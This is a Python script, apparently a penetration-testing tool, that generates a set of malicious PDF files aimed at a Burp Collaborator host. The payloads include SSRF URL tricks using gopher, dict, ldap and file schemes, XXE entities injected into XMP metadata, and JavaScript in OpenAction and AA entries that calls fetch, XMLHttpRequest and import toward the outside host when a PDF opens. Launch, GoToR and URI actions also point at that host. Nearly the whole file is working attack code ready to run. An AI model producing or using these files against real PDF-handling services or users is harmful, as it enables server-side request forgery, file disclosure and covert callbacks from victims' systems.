import os
from pathlib import Path

def generate_pdf_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    
    ssrf_payloads = [
        f"http://{burp_collab}/ssrf1",
        f"https://{burp_collab}/ssrf2",
        f"http://{burp_collab}:80/ssrf3",
        f"https://{burp_collab}:443/ssrf4",
        f"http://127.0.0.1@{burp_collab}/ssrf5",
        f"http://localhost@{burp_collab}/ssrf6",
        f"http://[::1]@{burp_collab}/ssrf7",
        f"file://{burp_collab}/ssrf8",
        f"gopher://{burp_collab}/ssrf9",
        f"dict://{burp_collab}/ssrf10",
        f"ldap://{burp_collab}/ssrf11",
    ]
    
    xxe_payloads = [
        f'<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe1">',
        f'<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe2">',
        f'<!ENTITY xxe SYSTEM "file://{burp_collab}/xxe3">',
        f'<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://{burp_collab}/xxe4">',
        f'<!ENTITY % xxe SYSTEM "http://{burp_collab}/xxe5">',
        f'<!ENTITY % xxe SYSTEM "file://{burp_collab}/xxe6">',
        f'<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe7">]>',
    ]
    
    rce_payloads = [
        f"fetch('http://{burp_collab}/rce1')",
        f"eval('fetch(\\'http://{burp_collab}/rce2\\')')",
        f"XMLHttpRequest().open('GET','http://{burp_collab}/rce3')",
        f"import('http://{burp_collab}/rce4')",
        f"app.alert('http://{burp_collab}/rce5')",
        f"this.submitForm({{cURL: 'http://{burp_collab}/rce6'}})",
    ]
    
    pdf_header = b'%PDF-1.4\n'
    pdf_trailer = b'\n%%EOF'
    
    for i, payload in enumerate(ssrf_payloads, 1):
        pdf_content = pdf_header + payload.encode() + pdf_trailer
        output_file = output_dir / f"pdf_ssrf_{i}.pdf"
        with open(output_file, 'wb') as f:
            f.write(pdf_content)
    
    xmp_xxe_template = f'''<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="" xmlns:pdf="http://ns.adobe.com/pdf/1.3/">
<pdf:Producer>Test</pdf:Producer>
</rdf:Description>
<rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/">
<xmp:CreatorTool>Test</xmp:CreatorTool>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>'''
    
    for i, payload in enumerate(xxe_payloads, 1):
        xmp_with_xxe = xmp_xxe_template.replace('Test', payload)
        pdf_content = pdf_header + xmp_with_xxe.encode() + pdf_trailer
        output_file = output_dir / f"pdf_xxe_{i}.pdf"
        with open(output_file, 'wb') as f:
            f.write(pdf_content)
    
    for i, payload in enumerate(rce_payloads, 1):
        pdf_js_simple = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS ({payload})
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Test) Tj
ET
endstream
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
        output_file = output_dir / f"pdf_rce_{i}.pdf"
        with open(output_file, 'wb') as f:
            f.write(pdf_js_simple.encode())
    
    pdf_js_embedded = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (fetch('http://{burp_collab}/rce_embedded'))
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    
    output_file = output_dir / "pdf_rce_embedded.pdf"
    with open(output_file, 'wb') as f:
        f.write(pdf_js_embedded.encode())
    
    pdf_uri_action = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Action
/S /URI
/URI (http://{burp_collab}/uri_action)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [5 0 R]
>>
endobj
5 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (http://{burp_collab}/annotation_uri)
>>
>>
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    
    output_file = output_dir / "pdf_ssrf_uri_action.pdf"
    with open(output_file, 'wb') as f:
        f.write(pdf_uri_action.encode())
    
    pdf_goto_r = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Action
/S /GoToR
/F (http://{burp_collab}/goto_r)
/D [0 /Fit]
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    
    output_file = output_dir / "pdf_ssrf_goto_r.pdf"
    with open(output_file, 'wb') as f:
        f.write(pdf_goto_r.encode())
    
    pdf_launch_action = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Action
/S /Launch
/F (http://{burp_collab}/launch)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    
    output_file = output_dir / "pdf_ssrf_launch.pdf"
    with open(output_file, 'wb') as f:
        f.write(pdf_launch_action.encode())
    
    pdf_aa_action = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/AA <<
/O <<
/S /JavaScript
/JS (fetch('http://{burp_collab}/aa_action'))
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    
    output_file = output_dir / "pdf_rce_aa_action.pdf"
    with open(output_file, 'wb') as f:
        f.write(pdf_aa_action.encode())

